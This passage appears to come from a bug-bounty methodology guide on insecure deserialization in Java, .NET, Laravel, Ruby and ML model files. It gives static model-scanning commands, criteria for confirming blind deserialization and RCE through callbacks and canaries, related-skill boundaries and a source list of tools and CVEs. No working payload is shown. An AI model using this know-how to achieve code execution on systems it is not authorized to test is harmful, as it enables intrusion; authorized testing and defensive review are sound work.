# GadgetProbe + Java Deserialization Scanner: both BApp Store extensions (Burp Extender).
# GadgetProbe's README mentions a CLI but documents no invocation for it; use Burp or the Java library.

# Static model-file review (never load the file)
pip install fickling modelscan
fickling --check-safety -p model.pkl
modelscan -p /path/to/model_file
```

---

## Validation

✅ DNS/HTTP callback from COLLAB host: blind deserialization confirmed
✅ Command output in response: full RCE confirmed

✅ URLDNS callback for a unique canary, control request with a non-serialized value produced none: sink confirmed, no code executed. Reportable as-is.
✅ GadgetProbe known-positive (`java.lang.String`) fired and known-negative (random package) did not: class-resolution oracle is trustworthy for this endpoint.
✅ Stage B RCE claim: the exact unique `$CANARY` echoed back **and** command output absent from the saved Stage-A baseline body. Canary missing = not confirmed.
✅ Model file: unsafe `GLOBAL`/`STACK_GLOBAL` + `REDUCE` in `pickletools` output, or a non-keras `module` in `config.json`, with the file never loaded.

❌ Not confirmation: no callback (egress filtering, a JEP 290 filter, resolver caching and framing mismatches all suppress it); one GadgetProbe class hit treated as a working chain; a bare `uid=` with no canary; a severity claim of RCE on a SignedObject sink whose signature gate held.

**Severity:** Almost always **Critical** — RCE with server process privileges.

A confirmed sink with execution never attempted is still Critical. Say which rung you stopped at, and why.

---

## Related Skills & Chains

| Skill | Boundary |
|---|---|
| `hunt-aspnet` | Owns ViewState and `machineKey`. Phase 4 here is the sink; the key recovery, `__VIEWSTATEGENERATOR` handling and ysoserial.net ViewState plugin flags live there. |
| `hunt-laravel` | Owns `.env` / `APP_KEY` discovery and classic encrypted-cookie forging. Phase 2b here owns Livewire hydration mechanics. |
| `hunt-rce` | Owns SnakeYAML, Ruby `rdoc_options` YAML and SpEL. Come here when the entry point is a serialized blob rather than a command string. |
| `hunt-file-upload` | The front door for Phase 7. A model-file upload is both an upload bug and a deserialization sink. |
| `hunt-llm-ai`, `hunt-rag-vector` | AI-pipeline framing, supply chain of pulled models, and OOB proof for AI features. Model-file deserialization mechanics stay in Phase 7. |
| `hunt-ssrf` | Where a Ruby class-pollution write lands on an HTTP destination. |
| `hunt-business-logic`, `hunt-api-misconfig` | Rails `_json` juggling and mass-assignment-shaped parameter confusion. |
| `triage-validation`, `evidence-hygiene` | Run before submitting any Stage B RCE claim. |

---

## Sources & Coverage Provenance

Technique coverage for Phases 1b, 1c, 2b, 6b and 7 was cross-checked against HackTricks (<https://github.com/HackTricks-wiki/hacktricks>, CC BY-NC 4.0), used strictly as a checklist of what to cover and re-authored here, commit-pinned at `722fec5c0e9148ffc53346f8d61ed71abbf4c240`: `src/pentesting-web/deserialization/java-dns-deserialization-and-gadgetprobe.md`, `java-signedobject-gated-deserialization.md`, `livewire-hydration-synthesizer-abuse.md`, `ruby-class-pollution.md`, `ruby-_json-pollution.md`, and `src/generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md`.

Facts stated above were read from primary sources on 2026-10-11: the `ysoserial` README and `URLDNS.java`; the `ysoserial.net` README (formatter/gadget names and the `-f -g -c -o` flags); `BishopFox/GadgetProbe`; `torch.load` and the PyTorch serialization notes (ZIP layout, `weights_only` default from 2.6); `numpy.load` and `numpy.lib.format` (`\x93NUMPY`); `joblib.load`; `keras.io` `load_model` (`safe_mode`); the Python `pickletools` docs; the HDF5 File Format Specification Level 0A (signature bytes); OpenJDK `SignedObject.java` and the `ObjectInputStream` / `SignedObject` javadocs; `trailofbits/fickling`; `protectai/modelscan`; `synacktiv/Livepyre` and `synacktiv/laravel-crypto-killer`; Synacktiv's "Livewire: Remote Command Execution via Unmarshaling" (snapshot/checksum structure, the three synthesizer keys, and the `hydrateForUpdate` / `getMetaForPath` root cause); Doyensec's "Class Pollution in Ruby" (the Hashie `_` `!` `?` exemption and the instance-versus-class scope rule); upstream psych commit `176494297f`; GHSA records for CVE-2024-3660, CVE-2025-1550, CVE-2025-8747, CVE-2025-9905, CVE-2025-32434, CVE-2025-54068, CVE-2025-10035, CVE-2022-32224 and CVE-2020-8165; and the CISA KEV catalog feed.

Three items are deliberately marked unverified above rather than asserted. The NumPy version that changed the `allow_pickle` default: the vendor page does not state it. The full flag reference for `laravel_crypto_killer.py exploit`: its README documents that subcommand by example only. The psych/Ruby release that shipped the `safe_load` default: the commit is confirmed, the release boundary is not.

The Rails `_json` juggling shape in Phase 6b rests on the HackTricks checklist entry and the write-up it cites (`nastystereo.com`, not fetched this session). Treat it as a pattern to go and confirm against the target's own parameter handling, not as a cited advisory.
